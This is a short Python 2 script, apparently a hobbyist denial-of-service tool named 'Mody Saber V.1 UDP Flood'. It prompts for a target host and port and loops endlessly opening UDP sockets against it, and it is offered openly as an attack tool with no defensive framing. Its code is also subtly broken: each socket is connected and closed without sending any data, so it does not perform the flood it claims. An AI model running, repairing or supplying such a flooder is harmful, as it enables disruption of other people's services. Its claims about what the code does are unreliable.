#!/usr/bin/python
import socket, os, time, random
from sys import exit

print('''
___  ___          _         _____       _               
|  \/  |         | |       /  ___|     | |              
| .  . | ___   __| |_   _  \ `--.  __ _| |__   ___ _ __ 
| |\/| |/ _ \ / _` | | | |  `--. \/ _` | '_ \ / _ \ '__|
| |  | | (_) | (_| | |_| | /\__/ / (_| | |_) |  __/ |   
\_|  |_/\___/ \__,_|\__, | \____/ \__,_|_.__/ \___|_|   
                     __/ |                              
                    |___/      

                       V.1 UDP Flood
''')

url = raw_input("[IP]: ")
host = url.replace("http://", "").replace("https://", "").replace("http://www.", "").replace("https://www.", "").split('/')[0]
port = input("[*] Port: ")

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((host, port))
        s.close()
        print ("[+]=>> Layer 4 - UDP Flood | By Modysaber V.1 ^_^ " + host + ":" + str(port) + " <<=[+]")
    except socket.error:
        s.close()
        print ("[!] System Timeout")